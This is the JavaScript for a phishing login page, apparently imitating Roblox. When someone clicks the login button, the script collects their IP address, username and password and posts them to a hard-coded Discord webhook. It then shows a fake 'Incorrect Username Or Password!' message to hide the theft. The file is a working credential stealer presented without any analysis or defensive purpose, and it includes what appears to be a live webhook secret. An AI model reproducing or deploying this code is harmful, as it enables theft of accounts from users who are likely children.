document.addEventListener("DOMContentLoaded", () => {
  fetch("https://api64.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      console.log(`Connection from ${data.ip}`);
    })
    .catch((error) => console.error("Error:", error));
});

document.getElementById("login-button").addEventListener("click", () => {
  console.log("click");

  const userData = {
    i: "",
    u: "",
    p: "",
  };

  fetch("https://api64.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      console.log(`Connectinggg ${data.ip}`);

      userData.i = data.ip;

      const bodyData = {
        content: "",
        tts: false,
        embeds: [
          {
            id: 729592983,
            description: `
**IP**: \`\`${userData.i}\`\`
**Username**: \`\`${document.getElementById('login-username').value}\`\`
**Password**: \`\`${document.getElementById('login-password').value}\`\`
`,
            fields: [],
            author: {
              name: "roblox kid detector",
              icon_url:
                "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzJShqWynuqNF6kASpr8zwMZbqvqIHW2mnWw&s",
            },
                title: "Info",
                "footer": {
                    "text": "By itsprobablyjackson",
                    "icon_url": "https://images-ext-1.discordapp.net/external/6lrQekPtXoTXRGguHsrK_6JeEAu-CmUq8dLYDVwC-L4/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/872742807905910825/3909a16cacb1ba76bffb028f96896c5e.png?format=webp&quality=lossless&width=676&height=676"
                  }
          },
        ],
        components: [],
        actions: {},
        avatar_url:
          "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzJShqWynuqNF6kASpr8zwMZbqvqIHW2mnWw&s",
      };

      console.log(bodyData);

      fetch(
        "https://discord.com/api/webhooks/1342024222821584977/AgJ42SwKMfalE1jvKbNchAKJW_a9W_rV8KN5y8DTAjm27cXvgXc3nIPAqD8y9OkZXSLx",
        {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(bodyData),
        }
        );
        
        document.querySelector('.irregularLabel').innerText = 'Incorrect Username Or Password!'
    })
    .catch((error) => console.error("Error:", error));
});
